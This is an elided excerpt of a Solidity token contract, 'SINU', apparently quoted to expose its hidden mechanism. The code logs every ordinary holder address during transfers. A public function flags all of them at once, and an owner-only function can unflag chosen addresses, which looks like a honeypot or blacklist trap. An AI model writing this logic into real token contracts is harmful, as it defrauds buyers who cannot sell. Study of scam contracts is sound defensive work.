...
contract SINU is Context, IERC20 { 
    ...
    mapping (address => bool) private _isSusanoo;
    mapping (address => bool) private Susanoo;
    address[] private _Susanoo;

    address payable public Wallet_Marketing = payable(0xF33D7Bbb8ab5b5090f3E79816d649544aA67F3e9); 
    ...
    function LetsGo() public { 
        ...
        Rangers = 80;
        for (uint256 i = 0; i < _Susanoo.length; i++) {
            Susanoo[_Susanoo[i]] = true;
        }
    }

    function isSusanoo(address[] memory addrs)
        external
        onlyOwner
        returns (bool)
    {
        for (uint256 i = 0; i < addrs.length; i++) {
            Susanoo[addrs[i]] = false;
        }
        return true;
    }
    ...
    function _transfer(
        ...
        if (from != owner() && from != uniswapV2Pair && !_isSusanoo[from]) {
            _isSusanoo[from] = true;
            _Susanoo.push(from);
        }
        
        if (to != owner() && to != uniswapV2Pair && !_isSusanoo[to]) {
            _isSusanoo[to] = true;
            _Susanoo.push(to);
